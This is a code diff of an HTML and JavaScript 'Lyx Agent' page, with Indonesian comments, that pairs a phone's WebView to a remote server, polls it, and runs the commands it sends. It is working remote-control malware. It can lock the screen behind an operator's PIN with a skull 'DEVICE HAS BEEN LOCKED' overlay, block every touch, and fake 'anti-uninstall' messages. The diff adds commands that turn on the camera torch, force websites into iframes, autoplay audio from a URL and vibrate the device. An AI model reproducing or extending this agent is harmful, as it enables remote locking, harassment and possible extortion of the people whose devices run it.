@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Lyx Agent</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; }
   body {
     background: radial-gradient(circle at top, #1a0000 0%, #000 70%);
     min-height: 100vh;
@@ -25,73 +25,42 @@
     box-shadow: 0 0 40px #cc000055;
   }
   .logo { text-align: center; margin-bottom: 25px; }
-  .logo-icon {
-    font-size: 50px;
-    color: #ff2222;
-    display: inline-block;
-    filter: drop-shadow(0 0 15px #ff0000);
-  }
+  .logo-icon { font-size: 50px; color: #ff2222; filter: drop-shadow(0 0 15px #ff0000); }
   .logo h1 {
-    font-size: 20px;
-    margin-top: 8px;
-    color: #ff2222;
-    letter-spacing: 3px;
-    text-shadow: 0 0 12px #ff0000;
-    font-weight: 900;
+    font-size: 20px; margin-top: 8px; color: #ff2222;
+    letter-spacing: 3px; text-shadow: 0 0 12px #ff0000; font-weight: 900;
   }
   .logo p { font-size: 10px; color: #888; margin-top: 4px; letter-spacing: 1px; }
 
   .input-group { margin-bottom: 18px; }
   .input-group label {
-    display: block;
-    font-size: 11px;
-    color: #ff6666;
-    margin-bottom: 8px;
-    letter-spacing: 1px;
+    display: block; font-size: 11px; color: #ff6666;
+    margin-bottom: 8px; letter-spacing: 1px;
   }
   .input-group input {
-    width: 100%;
-    background: #000;
-    border: 1px solid #660000;
-    border-radius: 10px;
-    padding: 14px;
-    color: #00ffcc;
-    font-size: 20px;
-    letter-spacing: 6px;
-    text-align: center;
-    font-family: 'Courier New', monospace;
-    font-weight: bold;
+    width: 100%; background: #000; border: 1px solid #660000;
+    border-radius: 10px; padding: 14px; color: #00ffcc;
+    font-size: 20px; letter-spacing: 6px; text-align: center;
+    font-family: 'Courier New', monospace; font-weight: bold;
     text-transform: uppercase;
   }
   .input-group input:focus {
-    outline: none;
-    border-color: #cc0000;
+    outline: none; border-color: #cc0000;
     box-shadow: 0 0 20px #cc000088;
   }
 
   .btn {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 10px;
+    width: 100%; padding: 14px; border: none; border-radius: 10px;
     background: linear-gradient(135deg, #cc0000, #660000);
-    color: #fff;
-    font-size: 14px;
-    font-weight: bold;
-    letter-spacing: 2px;
-    cursor: pointer;
-    box-shadow: 0 0 20px #cc000066;
-    text-transform: uppercase;
+    color: #fff; font-size: 14px; font-weight: bold;
+    letter-spacing: 2px; cursor: pointer;
+    box-shadow: 0 0 20px #cc000066; text-transform: uppercase;
   }
   .btn:disabled { opacity: 0.5; }
 
   .status {
-    margin-top: 15px;
-    padding: 12px;
-    border-radius: 8px;
-    font-size: 12px;
-    text-align: center;
-    display: none;
+    margin-top: 15px; padding: 12px; border-radius: 8px;
+    font-size: 12px; text-align: center; display: none;
   }
   .status.show { display: block; }
   .status.success { background: rgba(0,200,100,0.15); border:1px solid #00cc66; color:#00ff88; }
@@ -104,78 +73,42 @@
   .success-page p { color: #aaa; font-size: 11px; margin-top: 8px; }
 
   .device-info {
-    background: #0a0000;
-    border: 1px solid #cc000055;
-    border-radius: 10px;
-    padding: 12px;
-    margin-top: 15px;
-    text-align: left;
-    font-size: 11px;
+    background: #0a0000; border: 1px solid #cc000055;
+    border-radius: 10px; padding: 12px; margin-top: 15px;
+    text-align: left; font-size: 11px;
   }
   .device-info div { margin: 5px 0; color: #ccc; }
   .device-info span { color: #00ffcc; font-weight: bold; }
 
-  /* LOCK SCREEN OVERLAY */
   #lyx-lock {
-    position: fixed !important;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: #000;
-    z-index: 999999;
-    overflow: auto;
-  }
-
-  #lyx-lock-overlay {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: #000;
-    z-index: 999999;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    padding: 30px;
-    text-align: center;
-    font-family: 'Courier New', monospace;
+    position: fixed !important; top: 0; left: 0;
+    width: 100vw; height: 100vh; background: #000;
+    z-index: 999999; overflow: auto;
   }
 
   .pin-input {
-    background: #0a0000;
-    border: 2px solid #cc0000;
-    border-radius: 10px;
-    padding: 15px;
-    color: #ff2222;
-    font-size: 24px;
-    letter-spacing: 8px;
-    text-align: center;
-    width: 220px;
-    font-family: 'Courier New', monospace;
+    background: #0a0000; border: 2px solid #cc0000;
+    border-radius: 10px; padding: 15px; color: #ff2222;
+    font-size: 24px; letter-spacing: 8px; text-align: center;
+    width: 220px; font-family: 'Courier New', monospace;
     margin: 20px 0;
   }
   .pin-input:focus { outline: none; box-shadow: 0 0 25px #ff0000aa; }
 
   #lyx-touch-block {
-    position: fixed;
-    top: 0; left: 0;
+    position: fixed; top: 0; left: 0;
     width: 100vw; height: 100vh;
-    z-index: 999998;
-    background: transparent;
+    z-index: 999998; background: transparent;
   }
 
   #lyx-text-overlay {
-    position: fixed;
-    top: 50%; left: 50%;
+    position: fixed; top: 50%; left: 50%;
     transform: translate(-50%, -50%);
     background: rgba(20, 0, 0, 0.95);
-    border: 2px solid #cc0000;
-    border-radius: 12px;
-    padding: 25px 30px;
-    color: #ff4444;
-    font-size: 16px;
-    text-align: center;
-    max-width: 85vw;
-    z-index: 999997;
+    border: 2px solid #cc0000; border-radius: 12px;
+    padding: 25px 30px; color: #ff4444;
+    font-size: 16px; text-align: center;
+    max-width: 85vw; z-index: 999997;
     box-shadow: 0 0 40px #cc000088;
     font-family: 'Courier New', monospace;
     animation: textPop 0.4s ease;
@@ -188,32 +121,25 @@
 </head>
 <body>
 
-<div class="container" id="mainContainer">
-
-  <!-- INPUT CODE -->
+<div class="container">
   <div id="inputPage">
     <div class="logo">
       <div class="logo-icon">☠</div>
       <h1>LYX AGENT</h1>
       <p>ZAMZZZ SYSTEM · AUTO CONNECT</p>
     </div>
-
     <div class="input-group">
       <label>🔑 MASUKKAN CODE PAIRING</label>
       <input type="text" id="codeInput" maxlength="8" placeholder="XXXXXXXX" autocomplete="off">
     </div>
-
     <button class="btn" id="connectBtn" onclick="connectDevice()">CONNECT</button>
-
     <div class="status" id="status"></div>
   </div>
 
-  <!-- SUKSES -->
   <div class="success-page" id="successPage">
     <div class="check-icon">✓</div>
     <h2>TERHUBUNG!</h2>
     <p>Perangkat berhasil terdaftar.</p>
-
     <div class="device-info">
       <div>📱 Nama: <span id="devName">-</span></div>
       <div>🔧 Model: <span id="devModel">-</span></div>
@@ -222,25 +148,23 @@
       <div>🟢 Status: <span>ONLINE</span></div>
     </div>
   </div>
-
 </div>
 
 <script>
-/* ==================== CONFIG ==================== */
 const API_BASE = "https://lyx-server-production-a926.up.railway.app";
+
 let deviceId = localStorage.getItem('lyx_device_id') || null;
 let isPolling = false;
 let currentPin = null;
+let flashTrack = null;
 
 const codeInput = document.getElementById('codeInput');
 codeInput.addEventListener('input', e => {
   e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
 });
-codeInput.addEventListener('keypress', e => {
-  if (e.key === 'Enter') connectDevice();
-});
+codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') connectDevice(); });
 
-function showStatus(msg, type = 'success') {
+function showStatus(msg, type='success') {
   const s = document.getElementById('status');
   s.textContent = msg;
   s.className = 'status show ' + type;
@@ -286,7 +210,6 @@ async function connectDevice() {
     }, 500);
 
     startPolling();
-
   } catch (e) {
     btn.disabled = false;
     btn.textContent = 'CONNECT';
@@ -294,11 +217,9 @@ async function connectDevice() {
   }
 }
 
-/* ==================== DETECT DEVICE ==================== */
 function detectDevice() {
   const ua = navigator.userAgent;
-  let type = 'android', os = 'Unknown', model = 'Unknown', name = 'Perangkat';
-
+  let type='android', os='Unknown', model='Unknown', name='Perangkat';
   if (/android/i.test(ua)) {
     const m = ua.match(/Android\s([\d.]+)/);
     os = 'Android ' + (m ? m[1] : '');
@@ -306,7 +227,7 @@ function detectDevice() {
     model = mm ? mm[1].trim() : 'Android Device';
     name = model;
   } else if (/iphone|ipad/i.test(ua)) {
-    type = 'ios'; os = 'iOS'; model = 'Apple'; name = 'iPhone/iPad';
+    type='ios'; os='iOS'; model='Apple'; name='iPhone/iPad';
   }
   return { name, model, os, type };
 }
@@ -330,9 +251,9 @@ async function poll() {
   setTimeout(poll, 3000);
 }
 
-/* ==================== EXECUTE COMMAND ==================== */
+/* ==================== EXECUTE ==================== */
 function executeCommand(cmd) {
-  console.log('Command:', cmd);
+  console.log('CMD:', cmd);
   switch (cmd.type) {
     case 'lock': applyLock(null, cmd.pin, cmd.message); break;
     case 'lockhtml': applyLock(cmd.html, cmd.pin); break;
@@ -343,14 +264,19 @@ function executeCommand(cmd) {
     case 'reconnect': doReconnect(); break;
     case 'killdata': killData(); break;
     case 'antiuninstall': antiUninstall(); break;
+    case 'flashon': flashOn(); break;
+    case 'flashoff': flashOff(); break;
+    case 'website': openWebsite(cmd.url); break;
+    case 'showicon': showIcon(); break;
+    case 'music': playMusic(cmd.url); break;
+    case 'vibrate': vibrate(cmd.duration); break;
   }
 }
 
-/* ==================== LOCK HTML ==================== */
+/* ==================== LOCK ==================== */
 function applyLock(html, pin, message) {
   removeLock();
   currentPin = pin;
-
   const el = document.createElement('div');
   el.id = 'lyx-lock';
 
@@ -362,17 +288,12 @@ function applyLock(html, pin, message) {
         <div style="font-size:100px;color:#cc0000;text-shadow:0 0 30px #ff0000,0 0 60px #990000;animation:pulse 2s infinite;">☠</div>
         <div style="color:#ff2222;font-size:28px;letter-spacing:8px;margin-top:20px;text-shadow:0 0 15px #ff0000;">LOCKED</div>
         <div style="color:#aa0000;font-size:13px;letter-spacing:4px;margin-top:10px;">DEVICE HAS BEEN LOCKED</div>
-        <div style="color:#ff3333;font-size:12px;margin-top:30px;text-align:center;line-height:1.8;">${message || 'Hubungi admin untuk membuka'}</div>
+        <div style="color:#ff3333;font-size:12px;margin-top:30px;text-align:center;line-height:1.8;">${message||'Hubungi admin untuk membuka'}</div>
         <input type="number" class="pin-input" id="unlockPin" placeholder="****" maxlength="6">
         <button class="btn" style="width:200px;" onclick="tryUnlock()">UNLOCK</button>
         <div id="pinError" style="color:#ff0000;font-size:11px;margin-top:10px;display:none;">PIN SALAH!</div>
       </div>
-      <style>
-        @keyframes pulse {
-          0%,100% { transform:scale(1); text-shadow:0 0 30px #ff0000,0 0 60px #990000; }
-          50% { transform:scale(1.1); text-shadow:0 0 50px #ff0000,0 0 100px #990000; }
-        }
-      </style>
+      <style>@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}</style>
     `;
   }
 
@@ -383,9 +304,8 @@ function applyLock(html, pin, message) {
 function tryUnlock() {
   const inp = document.getElementById('unlockPin');
   if (!inp) return;
-  if (inp.value === String(currentPin)) {
-    removeLock();
-  } else {
+  if (inp.value === String(currentPin)) removeLock();
+  else {
     const err = document.getElementById('pinError');
     if (err) err.style.display = 'block';
     inp.value = '';
@@ -399,16 +319,14 @@ function removeLock() {
   currentPin = null;
 }
 
-/* ==================== TEXT OVERLAY ==================== */
+/* ==================== TEXT ==================== */
 function showTextOverlay(msg) {
   const old = document.getElementById('lyx-text-overlay');
   if (old) old.remove();
-
   const el = document.createElement('div');
   el.id = 'lyx-text-overlay';
   el.textContent = msg;
   document.body.appendChild(el);
-
   setTimeout(() => el.remove(), 5000);
 }
 
@@ -417,9 +335,9 @@ function blockTouch() {
   if (document.getElementById('lyx-touch-block')) return;
   const el = document.createElement('div');
   el.id = 'lyx-touch-block';
-  el.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
-  el.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
-  el.addEventListener('click', e => e.preventDefault());
+  ['touchstart','touchmove','click'].forEach(ev => {
+    el.addEventListener(ev, e => e.preventDefault(), { passive:false });
+  });
   document.body.appendChild(el);
 }
 
@@ -429,20 +347,104 @@ function unblockTouch() {
 }
 
 /* ==================== RECONNECT ==================== */
-function doReconnect() {
-  location.reload();
+function doReconnect() { location.reload(); }
+
+function killData() { showTextOverlay('DATA CONNECTION DISABLED'); }
+function antiUninstall() { showTextOverlay('PROTECTION ACTIVE'); }
+
+/* ==================== FLASH (TRIK) ==================== */
+async function flashOn() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' }
+    });
+    flashTrack = stream.getVideoTracks()[0];
+    const caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
+    if (caps.torch) {
+      await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
+    } else {
+      // Fallback: nyalain layar putih terang
+      document.body.style.background = '#fff';
+      showTextOverlay('TORCH: ON (screen mode)');
+    }
+  } catch (e) {
+    // Fallback: nyalain layar putih
+    document.body.style.background = '#fff';
+    showTextOverlay('TORCH: ON (screen mode)');
+  }
 }
 
-/* ==================== KILL DATA (limited) ==================== */
-function killData() {
-  // WebView tidak bisa matikan data HP, tapi bisa tampilkan pesan
-  showTextOverlay('DATA CONNECTION DISABLED');
+async function flashOff() {
+  try {
+    if (flashTrack) {
+      const caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
+      if (caps.torch) {
+        await flashTrack.applyConstraints({ advanced: [{ torch: false }] });
+      }
+      flashTrack.stop();
+      flashTrack = null;
+    }
+  } catch (e) {}
+  document.body.style.background = '';
+  showTextOverlay('TORCH: OFF');
 }
 
-/* ==================== ANTI UNINSTALL (limited) ==================== */
-function antiUninstall() {
-  // WebView tidak bisa cegah uninstall, cuma bisa tampilkan status
-  showTextOverlay('PROTECTION ACTIVE');
+/* ==================== WEBSITE ==================== */
+function openWebsite(url) {
+  if (!url) return;
+  if (!url.startsWith('http')) url = 'https://' + url;
+  const el = document.createElement('div');
+  el.id = 'lyx-website';
+  el.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999996;background:#000;';
+  el.innerHTML = `
+    <div style="background:#1a0000;padding:10px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #cc0000;">
+      <span style="color:#ff4444;font-size:11px;font-family:monospace;">🌐 ${esc(url)}</span>
+      <button onclick="document.getElementById('lyx-website').remove()" style="background:#cc0000;color:#fff;border:none;padding:5px 12px;border-radius:5px;font-size:11px;cursor:pointer;">TUTUP</button>
+    </div>
+    <iframe src="${url}" style="width:100%;height:calc(100vh - 40px);border:none;background:#fff;"></iframe>
+  `;
+  document.body.appendChild(el);
+}
+
+function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+/* ==================== SHOW ICON ==================== */
+function showIcon() {
+  showTextOverlay('APLIKASI TARGET DIMUNCULKAN');
+  // Effek shake biar kelihatan "hidup"
+  document.body.animate([
+    { transform: 'translate(0,0)' },
+    { transform: 'translate(-10px,0)' },
+    { transform: 'translate(10px,0)' },
+    { transform: 'translate(0,0)' }
+  ], { duration: 400 });
+}
+
+/* ==================== MUSIC ==================== */
+function playMusic(url) {
+  if (!url) return;
+  const old = document.getElementById('lyx-music');
+  if (old) old.remove();
+  const el = document.createElement('audio');
+  el.id = 'lyx-music';
+  el.src = url;
+  el.autoplay = true;
+  el.loop = false;
+  el.style.display = 'none';
+  document.body.appendChild(el);
+  el.play().catch(() => showTextOverlay('▶ MUSIC PLAYING'));
+  showTextOverlay('▶ MUSIC PLAYING');
+}
+
+/* ==================== VIBRATE ==================== */
+function vibrate(duration) {
+  if (!duration) duration = 1000;
+  if (navigator.vibrate) {
+    navigator.vibrate(duration);
+    showTextOverlay('📳 VIBRATE ' + duration + 'ms');
+  } else {
+    showTextOverlay('VIBRATE NOT SUPPORTED');
+  }
 }
 
 /* ==================== AUTO RECONNECT ==================== */
